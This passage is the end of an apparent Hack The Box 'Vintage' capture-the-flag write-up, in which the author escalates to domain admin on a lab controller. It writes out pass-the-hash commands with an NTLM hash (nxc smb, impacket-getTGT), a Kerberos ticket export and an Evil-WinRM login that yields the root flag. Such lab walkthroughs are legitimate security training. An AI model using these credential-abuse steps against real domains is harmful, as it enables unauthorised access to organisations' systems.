![image.png](/assets/images/Vintage_HTB/image%2051.png)

We cant login as an administrator, but since we have all the keys lets try to login as **L.Bianchi_Adm**

```bash
nxc smb dc01.vintage.htb -k -u L.Bianchi_adm -H f50d4b6f0996caa3760b382793a7f52c
```

![image.png](/assets/images/Vintage_HTB/image%2052.png)

Got it !

We have a shell as **L.Bianchi_adm.**

Now using Evil-winrm to login as him.

So lets request a TGT for this user.

```bash
impacket-getTGT vintage.htb/'l.bianchi_adm' -hashes :f50d4b6f0996caa3760b382793a7f52c
```

![image.png](/assets/images/Vintage_HTB/image%2053.png)

Exporting L.bianchi_adm’s ticket to our kerberos environment variable.

![image.png](/assets/images/Vintage_HTB/image%2054.png)

```bash
evil-winrm -i dc01.vintage.htb -u l.bianchi_adm -r vintage.htb
```

![image.png](/assets/images/Vintage_HTB/image%2055.png)

Grabbing that root.txt file and submitting it.

Rooted!

![image.png](/assets/images/Vintage_HTB/image%2056.png)

Thanks for reading 😊
